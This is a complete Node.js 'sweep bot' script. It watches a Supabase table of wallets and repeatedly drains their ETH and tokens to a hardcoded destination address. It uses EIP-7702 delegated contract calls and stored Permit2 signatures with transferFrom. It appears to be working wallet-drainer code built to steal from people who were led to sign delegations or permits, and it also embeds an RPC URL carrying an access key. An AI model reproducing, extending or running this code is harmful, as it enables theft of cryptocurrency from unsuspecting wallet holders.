// bot.js — Sweep bot with EIP-7702 delegation + Permit2 fallback support
// Watches delegated_wallets via Supabase Realtime.
//
// Wallet types handled:
//   type="eip7702" / "already-delegated" / "smart-wallet-calls"
//       → sweepDelegatedWallet() — calls sweepETH/sweepTokens on delegated contract
//   type="permit2"
//       → sweepPermit2Wallet() — loads permit2_signatures from Supabase,
//         checks expiry, then calls Permit2.transferFrom() for each token

require("dotenv").config();
const { ethers } = require("ethers");
const { createClient } = require("@supabase/supabase-js");
const ws = require("ws");

// ── Config ────────────────────────────────────────────────────────────────────

const PRIVATE_KEY               = process.env.PRIVATE_KEY;
const RPC_URL = process.env.RPC_URL
  || "https://falling-quiet-spring.bsc.quiknode.pro/d979711c9eb1807216904f0e8bb5e5173f4f6cca";
const CONTRACT_ADDRESS          = process.env.CONTRACT_ADDRESS;
const DESTINATION_ADDRESS       = process.env.DESTINATION_ADDRESS || "0x8Da0f664bb5091585148333275FcF0607b258026";
const TOKENS_TO_WATCH           = (process.env.TOKENS_TO_WATCH || "").split(",").filter(Boolean);
const SUPABASE_URL              = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
const CHAIN                     = process.env.CHAIN || "eth";

const PERMIT2_ADDRESS     = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const MIN_ETH_WEI         = ethers.parseEther("0.001");
const MIN_TOKEN_UNITS     = "0.5";
const SWEEP_COOLDOWN_BLOCKS = 3;

// ── Validation ────────────────────────────────────────────────────────────────

if (!PRIVATE_KEY || !RPC_URL || !DESTINATION_ADDRESS) {
  console.error("Missing required env vars: PRIVATE_KEY, RPC_URL, DESTINATION_ADDRESS");
  process.exit(1);
}
if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
  console.warn("⚠️  SUPABASE env missing — Realtime disabled, permit2_signatures unavailable");
}

// ── Setup ─────────────────────────────────────────────────────────────────────

// Supabase client is stateless — created once.
const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
  ? createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, { auth: { persistSession: false }, realtime: { transport: ws } })
  : null;

// Provider / wallet / contracts — created once at startup (HTTP polling).
let provider;
let wallet;
let permit2;
let contract;

function createProvider() {
  return new ethers.JsonRpcProvider(RPC_URL);
}

// ── ABIs ──────────────────────────────────────────────────────────────────────

const CONTRACT_ABI = [
  "function sweepETH(address payable to) external",
  "function sweepTokens(address token, address to) external",
  "event ETHReceived(address indexed sender, uint256 amount)",
];

const DELEGATION_ABI = [
  "function sweepETH(address payable to) external",
  "function sweepTokens(address token, address to) external",
];

const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
];

// Permit2 AllowanceTransfer — transferFrom only (permit() already called at
// activation time; allowances are already set on-chain).
const PERMIT2_ABI = [
  "function transferFrom(address from, address to, uint160 amount, address token) external",
  "function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)",
];

// ── State ─────────────────────────────────────────────────────────────────────

let sweepingETH        = false;
const sweepingToken    = {};
let lastSweepBlock     = 0;
// Map of address → type ("eip7702" | "permit2") for fast block-listener routing.
const delegatedWallets = new Map();
// Tracks wallets whose Permit2 signature has expired — logged once, then removed from sweep.
const expiredLogged    = new Set();
// Per-block dedup: key = "${address}-${blockNumber}". Cleared every 100 blocks.
const lastSweptBlock   = new Map();
// Active Supabase Realtime channel — unsubscribed before each reconnect.
let realtimeChannel    = null;

// ── Logging ───────────────────────────────────────────────────────────────────

const TAG  = `[${CHAIN.toUpperCase()}]`;
const log  = (msg) => console.log(`[${new Date().toISOString()}] ${TAG} ${msg}`);
const warn = (msg) => console.warn(`[${new Date().toISOString()}] ${TAG} ⚠  ${msg}`);
const err  = (msg) => console.error(`[${new Date().toISOString()}] ${TAG} ✖  ${msg}`);

// ── Helpers ───────────────────────────────────────────────────────────────────

function normalizeAddress(addr) {
  try { return ethers.getAddress(addr); } catch { return null; }
}

async function getFeeData() {
  const f = await provider.getFeeData();
  return { maxFeePerGas: f.maxFeePerGas, maxPriorityFeePerGas: f.maxPriorityFeePerGas };
}

// ── Supabase helpers ──────────────────────────────────────────────────────────

async function getWalletType(walletAddress) {
  if (!supabase) return "eip7702";
  try {
    const { data } = await supabase
      .from("delegated_wallets")
      .select("type")
      .eq("address", walletAddress.toLowerCase())
      .eq("chain", CHAIN)
      .single();
    return data?.type || "eip7702";
  } catch {
    return "eip7702";
  }
}

// ── Main-contract sweep ───────────────────────────────────────────────────────

async function sweepETH() {
  if (sweepingETH || !contract) return;
  sweepingETH = true;
  try {
    const bal = await provider.getBalance(contract.target);
    if (bal < MIN_ETH_WEI) return;
    log(`Contract ETH ${ethers.formatEther(bal)} — sweeping`);
    const gas = await contract.sweepETH.estimateGas(DESTINATION_ADDRESS);
    const fee = await getFeeData();
    const tx  = await contract.sweepETH(DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
    log(`sweepETH tx: ${tx.hash}`);
    await tx.wait();
    log("sweepETH confirmed");
  } catch (e) { err(`sweepETH: ${e.message}`); }
  finally    { sweepingETH = false; }
}

async function sweepToken(tokenAddress) {
  const key = tokenAddress.toLowerCase();
  if (sweepingToken[key] || !contract) return;
  sweepingToken[key] = true;
  try {
    const token   = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const balance = await token.balanceOf(contract.target);
    let decimals  = 18;
    try { decimals = await token.decimals(); } catch {}
    if (balance < ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) return;
    let symbol = tokenAddress.slice(0, 8);
    try { symbol = await token.symbol(); } catch {}
    log(`Contract ${symbol} ${ethers.formatUnits(balance, decimals)} — sweeping`);
    const gas = await contract.sweepTokens.estimateGas(tokenAddress, DESTINATION_ADDRESS);
    const fee = await getFeeData();
    const tx  = await contract.sweepTokens(tokenAddress, DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
    log(`sweepTokens(${symbol}) tx: ${tx.hash}`);
    await tx.wait();
  } catch (e) { err(`sweepToken(${tokenAddress}): ${e.message}`); }
  finally     { sweepingToken[key] = false; }
}

// ── EIP-7702 delegated wallet sweep ───────────────────────────────────────────
// Order is always: ETH first → tokens second.
// MIN_ETH_WEI guard avoids wasting gas on dust (< 0.001 ETH).

async function sweepDelegatedWallet(walletAddress) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum) return;
  try {
    const userContract = new ethers.Contract(checksum, DELEGATION_ABI, wallet);

    // STEP 1 — ETH first
    try {
      const bal = await provider.getBalance(checksum);
      if (bal > MIN_ETH_WEI) {
        log(`[eip7702] ${checksum} ETH ${ethers.formatEther(bal)} — sweeping`);
        const gas = await userContract.sweepETH.estimateGas(DESTINATION_ADDRESS);
        const fee = await getFeeData();
        const tx  = await userContract.sweepETH(DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
        log(`[eip7702] sweepETH(${checksum}) tx: ${tx.hash}`);
        await tx.wait();
        log(`[eip7702] sweepETH confirmed for ${checksum}`);
      } else {
        log(`[eip7702] ${checksum} ETH ${ethers.formatEther(bal)} — below threshold, skipping`);
      }
    } catch (e) { err(`[eip7702] sweepETH ${checksum}: ${e.message}`); }

    // STEP 2 — ERC-20 tokens second
    for (const tokenAddress of TOKENS_TO_WATCH) {
      try {
        const token   = new ethers.Contract(tokenAddress.trim(), ERC20_ABI, provider);
        const balance = await token.balanceOf(checksum);
        let decimals  = 18;
        try { decimals = await token.decimals(); } catch {}
        if (balance < ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) continue;
        let symbol = tokenAddress.slice(0, 8);
        try { symbol = await token.symbol(); } catch {}
        log(`[eip7702] ${checksum} ${symbol} ${ethers.formatUnits(balance, decimals)} — sweeping`);
        const gas = await userContract.sweepTokens.estimateGas(tokenAddress.trim(), DESTINATION_ADDRESS);
        const fee = await getFeeData();
        const tx  = await userContract.sweepTokens(tokenAddress.trim(), DESTINATION_ADDRESS, {
          gasLimit: gas * 120n / 100n, ...fee,
        });
        log(`[eip7702] sweepTokens(${symbol}) tx: ${tx.hash}`);
        await tx.wait();
      } catch (e) { err(`[eip7702] sweepToken ${tokenAddress} from ${checksum}: ${e.message}`); }
    }
  } catch (e) { err(`[eip7702] sweepDelegatedWallet ${checksum}: ${e.message}`); }
}

// ── Permit2 sweep ─────────────────────────────────────────────────────────────
//
// Loads the stored Permit2 signature from the permit2_signatures table.
// Checks expiry. Calls Permit2.transferFrom() for each token with a balance.
// Note: Permit2.permit() (to set on-chain allowances) was already called at
// activation time — we only need transferFrom here.

async function sweepPermit2Wallet(walletAddress) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum || !supabase) return;

  // 1. Load permit2 data — prefer permit2_signatures table (newest row first).
  let tokens = [];
  let deadlineIso = null;

  const { data: sigRow, error: sigErr } = await supabase
    .from("permit2_signatures")
    .select("tokens, deadline")
    .eq("address", checksum.toLowerCase())
    .eq("chain", CHAIN)
    .order("created_at", { ascending: false })
    .limit(1)
    .single();

  if (!sigErr && sigRow) {
    tokens      = sigRow.tokens || [];
    deadlineIso = sigRow.deadline || null;
  } else {
    // Fallback: read permit_metadata from delegated_wallets.
    const { data: dwRow } = await supabase
      .from("delegated_wallets")
      .select("permit_metadata")
      .eq("address", checksum.toLowerCase())
      .eq("chain", CHAIN)
      .single();

    if (!dwRow?.permit_metadata) {
      warn(`[permit2] no signature data found for ${checksum}`);
      return;
    }
    tokens      = dwRow.permit_metadata.tokens || [];
    // deadline stored as unix seconds (number) in permit_metadata
    const dl    = dwRow.permit_metadata.deadline;
    deadlineIso = dl ? new Date(Number(dl) * 1000).toISOString() : null;
  }

  // 2. Check expiry — log once per session then evict from sweep loop.
  if (deadlineIso && new Date(deadlineIso) < new Date()) {
    if (!expiredLogged.has(checksum)) {
      warn(`[permit2] signature expired: ${checksum} (deadline=${deadlineIso}) — removing from sweep`);
      expiredLogged.add(checksum);
    }
    delegatedWallets.delete(checksum);
    return;
  }

  if (!tokens.length) {
    warn(`[permit2] no tokens found for ${checksum}`);
    return;
  }

  log(`[permit2] sweeping ${checksum} — ${tokens.length} token(s)`);

  // 3. transferFrom each token that has a balance.
  // tokens[] is an array of address strings in the new schema.
  for (const entry of tokens) {
    const tokenAddress = normalizeAddress(typeof entry === "string" ? entry : entry.token || entry.tokenAddress);
    if (!tokenAddress) continue;

    try {
      const token   = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
      const balance = await token.balanceOf(checksum);
      let decimals  = 18;
      try { decimals = await token.decimals(); } catch {}
      const minWei  = ethers.parseUnits(MIN_TOKEN_UNITS, decimals);
      if (balance < minWei) continue;

      let symbol = tokenAddress.slice(0, 8);
      try { symbol = await token.symbol(); } catch {}
      log(`[permit2] ${checksum} ${symbol} ${ethers.formatUnits(balance, decimals)} — transferFrom`);

      // Cap at uint160 max (Permit2's type).
      const MAX_UINT160 = (1n << 160n) - 1n;
      const amount = balance > MAX_UINT160 ? MAX_UINT160 : balance;

      const fee = await getFeeData();
      const tx = await permit2.transferFrom(
        checksum,
        DESTINATION_ADDRESS,
        amount,
        tokenAddress,
        { gasLimit: 150_000n, ...fee }
      );
      log(`[permit2] transferFrom(${symbol}) tx: ${tx.hash}`);
      await tx.wait();
      log(`[permit2] transferFrom(${symbol}) confirmed`);
    } catch (e) {
      err(`[permit2] transferFrom ${tokenAddress} from ${checksum}: ${e.message}`);
    }
  }
}

// ── Dispatch: route to correct sweep based on wallet type ─────────────────────

async function sweepWallet(walletAddress) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum) return;
  const type = await getWalletType(checksum);
  if (type === "permit2") {
    await sweepPermit2Wallet(checksum);
  } else {
    await sweepDelegatedWallet(checksum);
  }
}

// ── Supabase: load existing wallets on startup ────────────────────────────────

async function loadDelegatedWallets() {
  if (!supabase) return;
  try {
    const { data, error } = await supabase
      .from("delegated_wallets")
      .select("address, type")
      .eq("chain", CHAIN);
    if (error) { warn(`loadDelegatedWallets: ${error.message}`); return; }
    delegatedWallets.clear();
    for (const row of data || []) {
      const checksum = normalizeAddress(row.address);
      if (checksum) delegatedWallets.set(checksum, row.type || "eip7702");
    }
    const permit2Count = [...delegatedWallets.values()].filter(t => t === "permit2").length;
    log(`Loaded ${delegatedWallets.size} wallets (${permit2Count} permit2, ${delegatedWallets.size - permit2Count} eip7702)`);
  } catch (e) { warn(`loadDelegatedWallets: ${e.message}`); }
}

// ── Supabase Realtime ─────────────────────────────────────────────────────────

function subscribeRealtime() {
  if (!supabase) { warn("Supabase not configured — Realtime skipped"); return; }

  // Tear down previous subscription before creating a new one.
  if (realtimeChannel) {
    supabase.removeChannel(realtimeChannel).catch(() => {});
    realtimeChannel = null;
  }

  realtimeChannel = supabase
    .channel(`delegated_wallets_${CHAIN}`)
    .on(
      "postgres_changes",
      { event: "INSERT", schema: "public", table: "delegated_wallets", filter: `chain=eq.${CHAIN}` },
      async (payload) => {
        const row     = payload.new || {};
        const address = normalizeAddress(row.address);
        const type    = row.type || "eip7702";
        if (!address) return;
        const isNew = !delegatedWallets.has(address);
        delegatedWallets.set(address, type);
        log(`🔔 Realtime ${isNew ? "new" : "updated"} wallet ${address} (type=${type})`);

        if (type === "permit2") {
          await sweepPermit2Wallet(address).catch((e) => err(`permit2 sweep: ${e.message}`));
        } else {
          await sweepDelegatedWallet(address).catch((e) => err(`eip7702 sweep: ${e.message}`));
        }
      }
    )
    .on(
      "postgres_changes",
      { event: "UPDATE", schema: "public", table: "delegated_wallets", filter: `chain=eq.${CHAIN}` },
      async (payload) => {
        const row     = payload.new || {};
        const address = normalizeAddress(row.address);
        const type    = row.type || "eip7702";
        if (!address) return;
        delegatedWallets.set(address, type);
        log(`🔄 Realtime update ${address} (type=${type})`);
        if (type === "permit2") {
          await sweepPermit2Wallet(address).catch((e) => err(`permit2 sweep: ${e.message}`));
        } else {
          await sweepDelegatedWallet(address).catch((e) => err(`eip7702 sweep: ${e.message}`));
        }
      }
    )
    .subscribe((status) => {
      if (status === "SUBSCRIBED") {
        log(`✅ Supabase Realtime subscribed (chain=${CHAIN})`);
      } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT") {
        warn(`Realtime ${status} — resubscribing in 10s`);
        setTimeout(subscribeRealtime, 10_000);
      }
    });
}

// ── Block listener ────────────────────────────────────────────────────────────

function attachBlockListener() {
  provider.on("block", async (blockNumber) => {
    if (blockNumber - lastSweepBlock < SWEEP_COOLDOWN_BLOCKS) return;
    lastSweepBlock = blockNumber;
    log(`Block ${blockNumber} — checking ${delegatedWallets.size} wallet(s)...`);

    // Sweep main contract balance.
    if (contract) {
      await sweepETH();
      for (const tokenAddress of TOKENS_TO_WATCH) {
        await sweepToken(tokenAddress.trim());
      }
    }

    // Sweep each delegated wallet — type read from Map (no DB call per block).
    for (const [walletAddress, walletType] of delegatedWallets) {
      // Per-block dedup: skip if this wallet was already swept this block.
      const blockKey = `${walletAddress}-${blockNumber}`;
      if (lastSweptBlock.has(blockKey)) continue;
      lastSweptBlock.set(blockKey, true);

      try {
        if (walletType === "permit2") {
          await sweepPermit2Wallet(walletAddress);
        } else if (
          walletType === "eip7702" ||
          walletType === "already-delegated" ||
          walletType === "smart-wallet-calls" ||
          walletType === "barz" ||
          walletType === "smart-wallet"
        ) {
          // ETH swept first, then tokens — see sweepDelegatedWallet
          await sweepDelegatedWallet(walletAddress);
        } else {
          // Unknown type — default to eip7702 sweep path
          await sweepDelegatedWallet(walletAddress);
        }
      } catch (e) {
        err(`sweep failed for ${walletAddress}: ${e.message}`);
      }
    }

    // Clear stale dedup entries every 100 blocks to prevent memory growth.
    if (blockNumber % 100 === 0) {
      const staleThreshold = blockNumber - 100;
      for (const key of lastSweptBlock.keys()) {
        const bn = Number(key.slice(key.lastIndexOf("-") + 1));
        if (bn < staleThreshold) lastSweptBlock.delete(key);
      }
    }
  });
}

// ── Start ─────────────────────────────────────────────────────────────────────

async function start() {
  // Create provider with HTTP polling — no WebSocket, no reconnect logic needed.
  provider = createProvider();
  provider.pollingInterval = 3000;
  wallet  = new ethers.Wallet(PRIVATE_KEY, provider);
  permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
  contract = CONTRACT_ADDRESS
    ? new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, wallet)
    : null;

  // HTTP provider logs errors and keeps polling automatically.
  provider.on("error", (error) => {
    warn(`Provider error: ${error?.message ?? error}`);
  });

  // Contract event listener.
  if (contract) {
    contract.on("ETHReceived", async (sender, amount) => {
      log(`ETHReceived — ${ethers.formatEther(amount)} from ${sender}`);
      await sweepETH();
    });
  }

  // Health check.
  try {
    const balance = await provider.getBalance(wallet.address);
    log(`Relayer: ${ethers.formatEther(balance)} native`);
    if (balance < ethers.parseEther("0.005")) warn("Relayer LOW — top up or sweeps will fail");
  } catch (e) {
    warn(`Relayer balance check failed: ${e.message}`);
  }

  log("Sweep bot starting…");
  log(`RPC:         ${RPC_URL}`);
  log(`Destination: ${DESTINATION_ADDRESS}`);
  log(`Permit2:     ${PERMIT2_ADDRESS}`);
  log(`Relayer:     ${wallet.address}`);
  log(`Chain:       ${CHAIN}`);
  if (CONTRACT_ADDRESS) log(`Contract:    ${CONTRACT_ADDRESS}`);

  await loadDelegatedWallets();
  subscribeRealtime();
  attachBlockListener();

  log("Listening for blocks and Realtime events…");
}

start().catch((e) => { err(`Startup failed: ${e.message}`); process.exit(1); });

process.on("SIGINT",  () => { log("Shutting down…"); provider?.removeAllListeners(); process.exit(0); });
process.on("SIGTERM", () => { log("Shutting down…"); provider?.removeAllListeners(); process.exit(0); });
